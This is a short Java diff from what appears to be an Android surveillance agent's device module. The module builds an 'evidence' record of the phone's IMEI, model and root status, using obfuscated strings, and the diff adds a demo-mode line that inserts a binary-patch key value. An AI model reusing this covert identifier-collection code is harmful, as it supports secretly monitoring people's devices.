@@ -22,6 +22,7 @@ import com.android.dvci.RunningProcesses;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
+import com.android.dvci.crypto.Keys;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.listener.AR;
@@ -134,6 +135,9 @@ public class ModuleDevice extends BaseInstantModule {
 			boolean root = checkRoot();
 			boolean su = Status.self().haveSu();
 
+			if(Cfg.DEMO) {
+				sb.insert(0, M.e("BinaryPatched:") + Keys.self().binarypatch[8] + "\n");
+			}
 			sb.insert(0, M.e("Model:") + Build.DISPLAY + "\n");
 			sb.insert(0, M.e("IMEI: ") + Device.self().getImei() + "\n");
 			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") 	+ M.e(", Su: ") + (su ? "yes" : "no")
